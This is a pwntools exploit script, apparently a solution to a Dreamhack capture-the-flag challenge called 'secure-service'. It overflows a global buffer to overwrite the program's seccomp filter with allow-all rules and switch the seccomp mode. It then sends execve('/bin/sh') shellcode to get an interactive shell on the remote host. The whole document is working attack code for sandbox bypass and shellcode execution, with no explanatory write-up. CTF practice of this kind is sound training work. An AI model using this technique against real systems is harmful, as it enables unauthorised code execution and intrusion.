from pwn import *
HOST, PORT = 'host3.dreamhack.games', 19278
p = remote(HOST, PORT)
context.arch = 'amd64'
e = ELF('./deploy/secure-service', checksec=False)

G_BUF        = e.symbols['g_buf']        # 0x4080, 128 bytes
FILTER       = e.symbols['filter']       # 0x4100, 3 * sock_filter
SECCOMP_MODE = e.symbols['seccomp_mode'] # 0x4180, 기본값 1 (SECCOMP_MODE_STRICT)

SECCOMP_MODE_FILTER = 2
SECCOMP_RET_ALLOW   = 0x7fff0000

def sock_filter(code, jt, jf, k):
    return p16(code) + p8(jt) + p8(jf) + p32(k)

ret_allow = sock_filter(0x06, 0, 0, SECCOMP_RET_ALLOW)

payload  = b'A' * (FILTER - G_BUF)                 
payload += ret_allow * 3                           
payload += b'A' * (SECCOMP_MODE - (FILTER + 24))   
payload += p64(SECCOMP_MODE_FILTER)                 

# bof
p.sendlineafter(b'which method? ', b'bof')
p.sendlineafter(b'payload: ', payload)

# shellcode: execve("/bin/sh") 
p.sendlineafter(b'which method? ', b'shellcode')
p.sendafter(b'shellcode: ', asm(shellcraft.execve('/bin/sh', 0, 0)))

p.interactive()
